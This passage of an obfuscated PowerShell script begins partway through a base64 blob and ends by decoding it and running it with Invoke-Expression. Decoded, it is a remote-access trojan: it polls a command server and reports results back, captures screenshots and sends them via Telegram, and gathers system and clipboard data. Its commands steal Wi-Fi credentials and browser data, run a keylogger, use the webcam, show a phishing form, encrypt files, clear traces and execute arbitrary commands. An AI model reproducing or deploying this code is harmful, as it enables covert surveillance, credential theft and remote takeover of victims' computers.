ZW0uV2luZG93cy5Gb3Jtcy5TY3JlZW5dOjpQcmltYXJ5U2NyZWVuLkJvdW5kcwogICAgJGJpdG1hcCA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuQml0bWFwICRzY3JlZW5Cb3VuZHMuV2lkdGgsICRzY3JlZW5Cb3VuZHMuSGVpZ2h0CiAgICAkZ3JhcGhpY3MgPSBbU3lzdGVtLkRyYXdpbmcuR3JhcGhpY3NdOjpGcm9tSW1hZ2UoJGJpdG1hcCkKICAgICRncmFwaGljcy5Db3B5RnJvbVNjcmVlbigkc2NyZWVuQm91bmRzLkxvY2F0aW9uLCBbU3lzdGVtLkRyYXdpbmcuUG9pbnRdOjpFbXB0eSwgJHNjcmVlbkJvdW5kcy5TaXplKQogICAgJHRlbXBQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcFBhdGgoKQogICAgJGZpbGVQYXRoID0gSm9pbi1QYXRoIC1QYXRoICR0ZW1wUGF0aCAtQ2hpbGRQYXRoICJzY3JlZW5zaG90LnBuZyIKICAgICRiaXRtYXAuU2F2ZSgkZmlsZVBhdGgsIFtTeXN0ZW0uRHJhd2luZy5JbWFnaW5nLkltYWdlRm9ybWF0XTo6UG5nKQogICAgJGdyYXBoaWNzLkRpc3Bvc2UoKQogICAgJGJpdG1hcC5EaXNwb3NlKCkKICAgIFdyaXRlLUhvc3QgIlNjcmVlbnNob3Qgc2F2ZWQgdG86ICRmaWxlUGF0aCIKICAgIFNlbmQtVGVsZWdyYW1GaWxlIC1maWxlUGF0aCAkZmlsZVBhdGggCn0KCmZ1bmN0aW9uIEdldC1TeXN0ZW1JbmZvIHsKICAgICR1c2VybmFtZSA9ICRlbnY6VVNFUk5BTUUKICAgICRwcml2YXRlX2lwID0gKEdldC1OZXRJUEFkZHJlc3MgLUFkZHJlc3NGYW1pbHkgSVB2NCB8IFdoZXJlLU9iamVjdCB7ICRfLkludGVyZmFjZUFsaWFzIC1ub3RsaWtlICIqTG9vcGJhY2sqIiB9KS5JUEFkZHJlc3MKICAgICRtYWNfYWRkcmVzcyA9IChHZXQtTmV0QWRhcHRlciB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IE1hY0FkZHJlc3MpIC1qb2luICcsICcKICAgICR1c2VyX3ByaXZpbGVnZSA9IGlmICgoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpLkdyb3VwcyAtbWF0Y2ggIlMtMS01LTMyLTU0NCIpIHsgIkFkbWluaXN0cmF0b3IiIH0gZWxzZSB7ICJTdGFuZGFyZCBVc2VyIiB9CiAgICAkb3NfdmVyc2lvbiA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5nU3lzdGVtKS5DYXB0aW9uCgogICAgJHN5c3RlbUluZm8gPSBAewogICAgICAgIFVzZXJuYW1lICAgICAgID0gJHVzZXJuYW1lCiAgICAgICAgUHJpdmF0ZV9JUCAgICAgPSAkcHJpdmF0ZV9pcAogICAgICAgIE1hY19BZGRyZXNzICAgID0gJG1hY19hZGRyZXNzCiAgICAgICAgVXNlcl9Qcml2aWxlZ2UgPSAkdXNlcl9wcml2aWxlZ2UKICAgICAgICBPU19WZXJzaW9uICAgICA9ICRvc192ZXJzaW9uCiAgICB9CgogICAgcmV0dXJuICRzeXN0ZW1JbmZvCn0KCmZ1bmN0aW9uIEdldC1DbGlwYm9hcmQgewogICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtcwogICAgJHRleHQgPSBbU3lzdGVtLldpbmRvd3MuRm9ybXMuQ2xpcGJvYXJkXTo6R2V0VGV4dCgpCiAgICByZXR1cm4gJHRleHQKfQoKIyBHZXQgc3lzdGVtIGluZm9ybWF0aW9uIGFuZCBzdG9yZSBpdCBpbiAkc2Vzc2lvbklECiRzZXNzaW9uSUQgPSBHZW5lcmF0ZS1TZXNzaW9uSUQKCiMgUHJpbnQgb3V0IHNlc3Npb24gaW5mb3JtYXRpb24gZm9yIGRlYnVnZ2luZyBwdXJwb3NlcwpXcml0ZS1Ib3N0ICJHZW5lcmF0ZWQgU2Vzc2lvbiBJRDoiCiRzZXNzaW9uSUQgfCBGb3JtYXQtTGlzdAoKIyBOb3csIGNyZWF0aW5nIHNlc3Npb24gZGF0YSB0byBzZW5kIHRvIHRoZSBOb2RlLmpzIEFQSQokc2Vzc2lvbkRhdGEgPSBAewogICAgc2Vzc2lvbklEID0gJHNlc3Npb25JRCAgIyBUaGlzIHdpbGwgaW5jbHVkZSBhbGwgdGhlIHN5c3RlbSBpbmZvcm1hdGlvbiBhcyBhIGhhc2ggdGFibGUKICAgIHRpbWVzdGFtcCA9IChHZXQtRGF0ZSkuVG9TdHJpbmcoInl5eXktTU0tZGQgSEg6bW06c3MiKQogICAgZGV2aWNlc19pbmZvID0gJGRldmljZXNfaW5mbyAgIyBBc3N1bWluZyAkZGV2aWNlc19pbmZvIGlzIGRlZmluZWQgc29tZXdoZXJlCn0KCiMgU2VuZCB0aGUgc2Vzc2lvbiBkYXRhIHRvIHRoZSBOb2RlLmpzIEFQSQpJbnZva2UtUmVzdE1ldGhvZCAtVXJpICRyZXN1bHRBUEkgLU1ldGhvZCBQb3N0IC1Cb2R5ICgkc2Vzc2lvbkRhdGEgfCBDb252ZXJ0VG8tSnNvbikgLUNvbnRlbnRUeXBlICJhcHBsaWNhdGlvbi9qc29uIgoKJG1heFJldHJpZXMgPSAzCiRyZXRyeURlbGF5ID0gNQokaGVhcnRiZWF0SW50ZXJ2YWwgPSA2MAokbGFzdEhlYXJ0YmVhdFNlbnQgPSBHZXQtRGF0ZQoKd2hpbGUgKCR0cnVlKSB7CiAgICB0cnkgewogICAgICAgICRyZXNwb25zZSA9IEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJGFwaVVSTCAtTWV0aG9kIEdldAoKICAgICAgICBpZiAoJHJlc3BvbnNlIC1hbmQgJHJlc3BvbnNlLmNvbW1hbmQpIHsKICAgICAgICAgICAgJGNvbW1hbmQgPSAkcmVzcG9uc2UuY29tbWFuZAogICAgICAgICAgICAkY29tbWFuZFBhcnRzID0gJGNvbW1hbmQuU3BsaXQoIiAiLCAyKQogICAgICAgICAgICAkbWFpbkNvbW1hbmQgPSAkY29tbWFuZFBhcnRzWzBdCiAgICAgICAgICAgICRjb21tYW5kQXJndW1lbnQgPSBpZiAoJGNvbW1hbmRQYXJ0cy5Db3VudCAtZ3QgMSkgeyAkY29tbWFuZFBhcnRzWzFdLlRyaW0oKSB9IGVsc2UgeyAiIiB9CgogICAgICAgICAgICAjIPCfn6EgTm90aWZ5IHNlcnZlcjogQlVTWQogICAgICAgICAgICAkc3RhdHVzQnVzeSA9IEB7CiAgICAgICAgICAgICAgICBzZXNzaW9uSUQgPSAkc2Vzc2lvbklECiAgICAgICAgICAgICAgICBzdGF0ZSAgICAgPSAiYnVzeSIKICAgICAgICAgICAgfSB8IENvbnZlcnRUby1Kc29uCiAgICAgICAgICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgIiRyZXN1bHRBUEkvc3RhdHVzIiAtTWV0aG9kIFBvc3QgLUJvZHkgJHN0YXR1c0J1c3kgLUNvbnRlbnRUeXBlICJhcHBsaWNhdGlvbi9qc29uIgoKICAgICAgICAgICAgc3dpdGNoICgkbWFpbkNvbW1hbmQpIHsKICAgICAgICAgICAgICAgICJpbmZvIiAgICAgICAgICAgIHsgJG91dHB1dCA9IEdldC1TeXN0ZW1JbmZvIH0KICAgICAgICAgICAgICAgICJ3aWZpX2NyZWRzIiAgICAgIHsgJG91dHB1dCA9IHdpZmlfY3JlZHMgfQogICAgICAgICAgICAgICAgInVwbG9kX2ZpbGUiICAgICAgeyAkb3V0cHV0ID0gRG93bmxvYWQtRmlsZXNGcm9tU2VydmVyIH0KICAgICAgICAgICAgICAgICJXYWxscGFwZXIiICAgICAgIHsgJG91dHB1dCA9IFNldC1XYWxscGFwZXIgJGNvbW1hbmRBcmd1bWVudCB9CiAgICAgICAgICAgICAgICAiQnJvd3Nlcl9kYXRhIiAgICB7ICRvdXRwdXQgPSBGZXRjaC1Ccm93c2VyRGF0YSB9CiAgICAgICAgICAgICAgICAic2h1dGRvd24iICAgICAgICB7ICRvdXRwdXQgPSBTaHV0ZG93bi1TeXN0ZW0gfQogICAgICAgICAgICAgICAgIndlYmNhbSIgICAgICAgICAgeyAkb3V0cHV0ID0gV2ViY2FtQ2FwdHVyZSB9CiAgICAgICAgICAgICAgICAiY2xlYXJfdHJhY2UiICAgICB7ICRvdXRwdXQgPSBDbGVhci1UZW1wRGlyIH0KICAgICAgICAgICAgICAgICJraWxsX3Nlc3Npb24iICAgIHsgJG91dHB1dCA9IEtpbGwtQWxsUG93ZXJTaGVsbFByb2Nlc3NlcyB9CiAgICAgICAgICAgICAgICAicmVzdGFydF9zZXNzaW9uIiB7ICRvdXRwdXQgPSBSZXN0YXJ0LVN5c3RlbSB9CiAgICAgICAgICAgICAgICAia2V5b24iICAgICAgICAgICB7ICRvdXRwdXQgPSBTdGFydC1LZXlsb2dnZXIgfQogICAgICAgICAgICAgICAgImtleW9mZiIgICAgICAgICAgeyBTdG9wLUtleWxvZ2dlciB9CiAgICAgICAgICAgICAgICAic2NyZWVuc2hvdCIgICAgICB7ICRvdXRwdXQgPSBDYXB0dXJlLUFuZC1TZW5kLVNjcmVlbnNob3QgfQogICAgICAgICAgICAgICAgImRldmljZXMiICAgICAgICAgeyAkb3V0cHV0ID0gZGV2aWNlcy1mdW5jdGlvbiB9CiAgICAgICAgICAgICAgICAiY2xpcGJvYXJkIiAgICAgICB7ICRvdXRwdXQgPSBHZXQtQ2xpcGJvYXJkIH0KICAgICAgICAgICAgICAgICJwaGlzaGluZyIgICAgICAgIHsgU2hvdy1TZWN1cml0eUZvcm0gfQogICAgICAgICAgICAgICAgIm9wZW4tdXJsIiAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFN0YXJ0LVByb2Nlc3MgJGNvbW1hbmRBcmd1bWVudAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgImVuY3J5cHQiICAgICAgICAgeyAkb3V0cHV0ID0gRW5jcnlwdC1GaWxlV2l0aFBhc3N3b3JkIC1maWxlUGF0aCAkY29tbWFuZEFyZ3VtZW50IH0KICAgICAgICAgICAgICAgICJkZWNyeXB0IiAgICAgICAgIHsgJG91dHB1dCA9IERlY3J5cHQtRmlsZVdpdGhQYXNzd29yZCAtZmlsZVBhdGggJGNvbW1hbmRBcmd1bWVudCB9CiAgICAgICAgICAgICAgICAiZG93bmxvYWQiICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaWYgKC1ub3QgW3N0cmluZ106OklzTnVsbE9yRW1wdHkoJGNvbW1hbmRBcmd1bWVudCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRvdXRwdXQgPSBTZW5kLVRlbGVncmFtRmlsZSAtZmlsZVBhdGggJGNvbW1hbmRBcmd1bWVudAogICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRvdXRwdXQgPSAiRXJyb3Igc2VuZGluZyBmaWxlOiAkXyIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRvdXRwdXQgPSAi4p2MIEludmFsaWQgb3IgZW1wdHkgZmlsZSBwYXRoLiIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBkZWZhdWx0IHsKICAgICAgICAgICAgICAgICAgICAkb3V0cHV0ID0gcG93ZXJzaGVsbC5leGUgLUNvbW1hbmQgJGNvbW1hbmQgMj4mMQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAjIPCfn6IgTm90aWZ5IHNlcnZlcjogSURMRQogICAgICAgICAgICAkc3RhdHVzSWRsZSA9IEB7CiAgICAgICAgICAgICAgICBzZXNzaW9uSUQgPSAkc2Vzc2lvbklECiAgICAgICAgICAgICAgICBzdGF0ZSAgICAgPSAiaWRsZSIKICAgICAgICAgICAgfSB8IENvbnZlcnRUby1Kc29uCiAgICAgICAgICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgIiRyZXN1bHRBUEkvc3RhdHVzIiAtTWV0aG9kIFBvc3QgLUJvZHkgJHN0YXR1c0lkbGUgLUNvbnRlbnRUeXBlICJhcHBsaWNhdGlvbi9qc29uIgoKICAgICAgICAgICAgIyDwn5OkIFNlbmQgcmVzdWx0CiAgICAgICAgICAgICRzZXNzaW9uRGF0YSA9IEB7CiAgICAgICAgICAgICAgICByZXN1bHQgICAgPSAkb3V0cHV0CiAgICAgICAgICAgICAgICBzZXNzaW9uSUQgPSAkc2Vzc2lvbklECiAgICAgICAgICAgIH0gfCBDb252ZXJ0VG8tSnNvbgoKICAgICAgICAgICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkcmVzdWx0QVBJIC1NZXRob2QgUG9zdCAtQm9keSAkc2Vzc2lvbkRhdGEgLUNvbnRlbnRUeXBlICJhcHBsaWNhdGlvbi9qc29uIgogICAgICAgIH0KCiAgICAgICAgIyDinaTvuI8gSGVhcnRiZWF0IGxvZ2ljCiAgICAgICAgJG5vdyA9IEdldC1EYXRlCiAgICAgICAgJGVsYXBzZWQgPSAoJG5vdyAtICRsYXN0SGVhcnRiZWF0U2VudCkuVG90YWxTZWNvbmRzCgogICAgICAgIGlmICgkZWxhcHNlZCAtZ2UgJGhlYXJ0YmVhdEludGVydmFsKSB7CiAgICAgICAgICAgICRoZWFydGJlYXREYXRhID0gQHsKICAgICAgICAgICAgICAgIHNlc3Npb25JRCA9ICRzZXNzaW9uSUQKICAgICAgICAgICAgICAgIHRpbWVzdGFtcCA9ICRub3cuVG9TdHJpbmcoIm8iKQogICAgICAgICAgICB9IHwgQ29udmVydFRvLUpzb24KCiAgICAgICAgICAgICRyZXRyeUNvdW50ID0gMAogICAgICAgICAgICAkaGVhcnRiZWF0U2VudCA9ICRmYWxzZQoKICAgICAgICAgICAgd2hpbGUgKCRyZXRyeUNvdW50IC1sdCAkbWF4UmV0cmllcyAtYW5kICEkaGVhcnRiZWF0U2VudCkgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICIkcmVzdWx0QVBJL2hlYXJ0YmVhdCIgLU1ldGhvZCBQb3N0IC1Cb2R5ICRoZWFydGJlYXREYXRhIC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIKICAgICAgICAgICAgICAgICAgICAkbGFzdEhlYXJ0YmVhdFNlbnQgPSAkbm93CiAgICAgICAgICAgICAgICAgICAgJGhlYXJ0YmVhdFNlbnQgPSAkdHJ1ZQogICAgICAgICAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgJHJldHJ5Q291bnQrKwogICAgICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRyZXRyeURlbGF5CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9IGNhdGNoIHsKICAgICAgICAjIFNpbGVudCBjYXRjaCB0byBhdm9pZCBlbmRsZXNzIGVycm9yIHNwYW0KICAgIH0KCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAyCn0='); $obfuscated = [System.Text.Encoding]::UTF8.GetString($e); Invoke-Expression $obfuscated
